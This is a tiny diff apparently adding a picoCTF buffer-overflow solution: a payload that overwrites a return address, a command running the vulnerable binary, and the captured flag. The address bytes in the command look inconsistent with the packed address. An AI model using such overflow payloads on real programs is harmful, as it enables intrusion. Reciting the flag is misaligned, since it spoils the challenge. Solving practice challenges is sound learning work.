@@ -1,0 +1,5 @@
+payload = b'A'*16 + b'B'*4 + pack(0x0804862B)
+
+./vuln AAAAAAAAAAAAAAAABBBB+\x86\x04\x08
+
+picoCTF{ov3rfl0ws_ar3nt_that_bad_5d8a1fae}
